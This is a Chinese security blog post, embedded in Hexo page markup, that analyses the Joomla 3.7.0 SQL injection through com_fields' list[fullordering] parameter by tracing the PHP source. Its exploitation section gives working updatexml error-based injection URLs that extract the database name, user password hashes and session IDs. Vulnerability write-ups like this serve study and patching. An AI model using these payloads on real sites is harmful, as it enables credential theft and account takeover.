+<p>调用D:\phpStudy\WWW\joomla370\libraries\cms\application\cms.php中类JApplicationCms的getUserStateFromRequest方法，getUserStateFromRequest注册变量，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserStateFromRequest</span><span class="params">($key, $request, $default = null, $type = <span class="string">'none'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$cur_state = <span class="keyword">$this</span>-&gt;getUserState($key, $default);</span><br><span class="line">	$new_state = <span class="keyword">$this</span>-&gt;input-&gt;get($request, <span class="keyword">null</span>, $type);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($new_state === <span class="keyword">null</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> $cur_state;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Save the new value only if it was set in this request.</span></span><br><span class="line">	<span class="keyword">$this</span>-&gt;setUserState($key, $new_state);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $new_state;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>调用getUserState方法，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserState</span><span class="params">($key, $default = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$session = JFactory::getSession();</span><br><span class="line">	$registry = $session-&gt;get(<span class="string">'registry'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!is_null($registry))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> $registry-&gt;get($key, $default);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $default;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>$session = JFactory::getSession()，调用\joomla370\libraries\joomla\factory.php中类JFactory的getSession方法，和createSession方法。注册session,$registry注册返回list。通过getUserStateFromRequest,取list值给$list,遍历$list设置list.fullfullordering<br><img src="/PHP/Joomla3.7.0SQL注入/20170524173413.jpg" alt=""><br>取出list.fullfullordering.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($tpl = null)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;state         = <span class="keyword">$this</span>-&gt;get(<span class="string">'State'</span>);	</span><br><span class="line">		<span class="keyword">$this</span>-&gt;items         = <span class="keyword">$this</span>-&gt;get(<span class="string">'Items'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>调用\joomla370\libraries\legacy\model\list.php中getItems方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getItems</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Get a storage key.</span></span><br><span class="line">	$store = <span class="keyword">$this</span>-&gt;getStoreId();	<span class="comment">//string(32) "fe326c1160d8d4a2ea5c1debd8dd5ef2"</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Try to load the data from internal storage.</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cache[$store]))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache[$store];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// Load the list items and add the items to the internal cache.</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;cache[$store] = <span class="keyword">$this</span>-&gt;_getList(<span class="keyword">$this</span>-&gt;_getListQuery(), <span class="keyword">$this</span>-&gt;getStart(), <span class="keyword">$this</span>-&gt;getState(<span class="string">'list.limit'</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (RuntimeException $e)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;setError($e-&gt;getMessage());</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache[$store];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>跟踪_getListQuery<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_getListQuery</span><span class="params">()</span>	//<span class="title">D</span>:\<span class="title">phpStudy</span>\<span class="title">WWW</span>\<span class="title">joomla370</span>\<span class="title">administrator</span>\<span class="title">components</span>\<span class="title">com_fields</span>\<span class="title">models</span>\<span class="title">fields</span>.<span class="title">php</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">// Capture the last store id used.</span></span><br><span class="line">		<span class="keyword">static</span> $lastStoreId;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Compute the current store id.</span></span><br><span class="line">		$currentStoreId = <span class="keyword">$this</span>-&gt;getStoreId();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// If the last store id is different from the current, refresh the query.</span></span><br><span class="line">		<span class="keyword">if</span> ($lastStoreId != $currentStoreId || <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;query))</span><br><span class="line">		&#123;</span><br><span class="line">			$lastStoreId = $currentStoreId;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;query = <span class="keyword">$this</span>-&gt;getListQuery();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;query;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>\joomla370\administrator\components\com_fields\models\fields.php跟踪getListQuery<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getListQuery</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">// Create a new query object.</span></span><br><span class="line">		$db    = <span class="keyword">$this</span>-&gt;getDbo();</span><br><span class="line">		$query = $db-&gt;getQuery(<span class="keyword">true</span>);</span><br><span class="line">		$user  = JFactory::getUser();</span><br><span class="line">		$app   = JFactory::getApplication();</span><br><span class="line">		......</span><br><span class="line">		$listOrdering = <span class="keyword">$this</span>-&gt;getState(<span class="string">'list.fullordering'</span>, <span class="string">'a.ordering'</span>);</span><br><span class="line">				$orderDirn    = <span class="string">''</span>;</span><br><span class="line">		</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">empty</span>($listOrdering))</span><br><span class="line">				&#123;</span><br><span class="line">					$listOrdering  = <span class="keyword">$this</span>-&gt;state-&gt;get(<span class="string">'list.ordering'</span>, <span class="string">'a.ordering'</span>);</span><br><span class="line">					$orderDirn     = <span class="keyword">$this</span>-&gt;state-&gt;get(<span class="string">'list.direction'</span>, <span class="string">'DESC'</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			</span><br><span class="line">				$query-&gt;order($db-&gt;escape($listOrdering) . <span class="string">' '</span> . $db-&gt;escape($orderDirn));		</span><br><span class="line">		</span><br><span class="line">				<span class="keyword">return</span> $query;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure></p>
+<p>拼接sql语句，order处调用list.fufuordering，带入order中造成注入。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>查询数据库<br><a href="http://127.0.0.1/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,database()),0" target="_blank" rel="noopener">http://127.0.0.1/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,database()),0</a>)<br><img src="/PHP/Joomla3.7.0SQL注入/20170524180553.jpg" alt=""><br>查询用户<br><a href="http://127.0.0.1/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(select%20concat(username,0x3a,password)%20from%20joomla370.y5s3b_users)),0" target="_blank" rel="noopener">http://127.0.0.1/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(select%20concat(username,0x3a,password)%20from%20joomla370.y5s3b_users)),0</a>)<br><img src="/PHP/Joomla3.7.0SQL注入/20170524180057.jpg" alt=""><br>查询密码，报错长度限制，分两次查询<br><a href="http://127.0.0.1/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(select%20left(password,30)%20from%20joomla370.y5s3b_users)),0" target="_blank" rel="noopener">http://127.0.0.1/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(select%20left(password,30)%20from%20joomla370.y5s3b_users)),0</a>)<br><a href="http://127.0.0.1/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(select%20right(password,30)%20from%20joomla370.y5s3b_users)),0" target="_blank" rel="noopener">http://127.0.0.1/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(select%20right(password,30)%20from%20joomla370.y5s3b_users)),0</a>)<br>查询登录session<br><a href="http://localhost/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" target="_blank" rel="noopener">http://localhost/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml</a>(1,concat(1,(select session_id from joomla370.y5s3b_session where username in (select username from joomla370.y5s3b_users))),1)</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>升级joomla最新版。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Joomla/" rel="tag"><i class="fa fa-tag"></i> Joomla</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/PHP/phpcms文件读取漏洞/" rel="next" title="phpcms文件读取漏洞">
+                <i class="fa fa-chevron-left"></i> phpcms文件读取漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/Linux/POC/samba远程代码执行漏洞/" rel="prev" title="samba远程代码执行漏洞">
+                samba远程代码执行漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="木蚂蚁" />
+            
+              <p class="site-author-name" itemprop="name">木蚂蚁</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞描述"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞修复"><span class="nav-number">4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">木蚂蚁</span>
+
+  
+</div>
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+<span class="post-meta-divider">|</span>
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
